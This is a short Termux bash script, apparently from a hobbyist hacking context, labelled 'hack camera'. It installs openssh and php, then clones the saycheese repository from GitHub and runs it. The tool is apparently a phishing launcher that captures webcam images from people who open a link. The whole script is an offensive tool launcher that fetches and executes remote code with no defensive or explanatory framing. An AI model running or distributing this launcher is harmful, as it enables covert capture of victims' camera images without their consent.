#!usr/bin/bash


#User_Tersakiti
#hack camera :v
echo "PowerdBy : User_Tersakiti"
echo ""
echo "Installing..."
sleep 2
apt install openssh -y
apt install php -y
clear
termux-setup-storage

cd /sdcard

git clone https://github.com/thelinuxchoice/saycheese
cd saycheese
bash saycheese.sh


